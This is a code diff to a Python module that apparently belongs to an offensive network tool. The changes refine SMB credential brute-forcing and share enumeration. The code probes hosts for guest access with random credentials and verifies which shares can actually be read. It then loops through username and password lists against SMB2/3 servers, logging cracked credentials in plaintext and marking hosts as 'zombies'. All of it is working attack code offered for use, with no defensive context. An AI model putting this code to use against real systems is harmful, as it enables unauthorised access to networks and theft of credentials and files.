@@ -9,10 +9,10 @@ import logging
 import time
 from subprocess import Popen, PIPE
 
-# Add vendored libs to path for pysmb
-_libs_path = os.path.join(os.path.dirname(os.path.dirname(os.path.abspath(__file__))), 'libs')
-if _libs_path not in sys.path:
-    sys.path.insert(0, _libs_path)
+# Add vendored lib to path for pysmb
+_lib_path = os.path.join(os.path.dirname(os.path.dirname(os.path.abspath(__file__))), 'lib')
+if _lib_path not in sys.path:
+    sys.path.insert(0, _lib_path)
 
 from smb.SMBConnection import SMBConnection
 from queue import Queue, Empty
@@ -186,6 +186,35 @@ class SMBConnector:
             return []
         except Exception as e:
             return []
+
+    def smb2_verify_share_access(self, adresse_ip, user, password, share_name):
+        """
+        Verify if a share is actually accessible by trying to list its contents.
+        Uses pysmb (SMBConnection) to check if we can read the share.
+        Returns True if share is accessible, False otherwise.
+        """
+        try:
+            conn = SMBConnection(user, password, "Bjorn", "Target", use_ntlm_v2=True)
+            connected = conn.connect(adresse_ip, 445, timeout=10)
+            if not connected:
+                return False
+            try:
+                # Try to list files in the share root
+                files = conn.listPath(share_name, '/', timeout=10)
+                conn.close()
+                # If we got here without exception, share is accessible
+                return len(files) > 0
+            except Exception as e:
+                error_msg = str(e).lower()
+                # Access denied means share exists but we can't access it
+                if 'access' in error_msg or 'denied' in error_msg or 'permission' in error_msg:
+                    conn.close()
+                    return False
+                conn.close()
+                return False
+        except Exception as e:
+            logger.debug(f"Share access verification failed for {share_name}: {e}")
+            return False
 
     def smb2_share_enum(self, adresse_ip, user, password):
         """
@@ -407,7 +436,7 @@ class SMBConnector:
             threads.append(t)
 
         # Wait for queue with exit signal checking
-        queue_timeout = 300  # 5 minute max for queue processing
+        queue_timeout = self.shared_data.bruteforce_queue_timeout
         queue_start = time.time()
         while not self.queue.empty():
             if self.shared_data.orchestrator_should_exit:
@@ -432,32 +461,46 @@ class SMBConnector:
         if hanging:
             logger.warning(f"SMB bruteforce: {len(hanging)} threads did not terminate cleanly")
 
-        # If no success with direct SMB connection (pysmb/SMB1), try smb2-share-enum (SMB2/3)
-        if not success_flag[0] and not self.shared_data.orchestrator_should_exit:
-            logger.info(f"Trying smb2-share-enum (SMB2/3) for {adresse_ip}")
+        # Also try smb2-share-enum (SMB2/3) to find authenticated shares
+        # Always run this even if guest access succeeded, to find shares requiring auth
+        if not self.shared_data.orchestrator_should_exit:
+            logger.info(f"Trying smb2-share-enum (SMB2/3) for authenticated shares on {adresse_ip}")
 
             # First check for guest access with garbage credentials
             import uuid
             garbage_user = f"guestcheck_{uuid.uuid4().hex[:8]}"
             garbage_pass = uuid.uuid4().hex
-            guest_shares = set(self.smb2_share_enum(adresse_ip, garbage_user, garbage_pass) or [])
+            listed_shares = self.smb2_share_enum(adresse_ip, garbage_user, garbage_pass) or []
 
-            # Log guest shares
+            # Verify which shares are actually accessible (not just listed)
+            guest_shares = set()
+            for share in listed_shares:
+                if share in IGNORED_SHARES:
+                    continue
+                # Verify we can actually access the share contents
+                if self.smb2_verify_share_access(adresse_ip, garbage_user, garbage_pass, share):
+                    guest_shares.add(share)
+                    logger.debug(f"Verified guest access to {share} on {adresse_ip}")
+                else:
+                    logger.debug(f"Share {share} on {adresse_ip} listed but not accessible via guest")
+
+            # Log verified guest shares
             if guest_shares:
                 logger.info(f"SMB2/3 guest access on {adresse_ip}: {len(guest_shares)} shares")
                 with self.lock:
                     for share in guest_shares:
-                        if share not in IGNORED_SHARES:
-                            self.results.append([mac_address, adresse_ip, hostname, share, "guest", "", port])
+                        self.results.append([mac_address, adresse_ip, hostname, share, "guest", "", port])
                     success_flag[0] = True
                 self.save_results()
                 self.removeduplicates()
                 self.shared_data.record_zombie(mac_address, adresse_ip)
 
-            # Continue brute force to find shares NOT accessible via guest
+            # Continue brute force to find shares that require authentication
+            # Only exclude shares that are ACCESSIBLE with guest, not just listed
             smb2_attempt_count = 0
             smb2_total = len(self.users) * len(self.passwords)
-            found_shares = set(guest_shares)  # Start with guest shares to avoid duplicates
+            # Track shares that are verified accessible (not just listed)
+            accessible_shares = set(guest_shares) | self.guest_shares
             for user in self.users:
                 if self.shared_data.orchestrator_should_exit:
                     break
@@ -469,11 +512,13 @@ class SMBConnector:
                         logger.info(f"SMB2/3 brute force: {smb2_attempt_count}/{smb2_total}")
                     shares = self.smb2_share_enum(adresse_ip, user, password)
                     if shares:
-                        new_shares = [s for s in shares if s not in IGNORED_SHARES and s not in found_shares]
-                        if new_shares:
-                            with self.lock:
-                                for share in new_shares:
-                                    found_shares.add(share)
+                        for share in shares:
+                            if share in IGNORED_SHARES or share in accessible_shares:
+                                continue
+                            # Verify we can actually access this share with these credentials
+                            if self.smb2_verify_share_access(adresse_ip, user, password, share):
+                                accessible_shares.add(share)
+                                with self.lock:
                                     self.results.append([mac_address, adresse_ip, hostname, share, user, password, port])
                                     logger.success(f"SMB credentials: {adresse_ip} | {user} | {share}")
                                     success_flag[0] = True
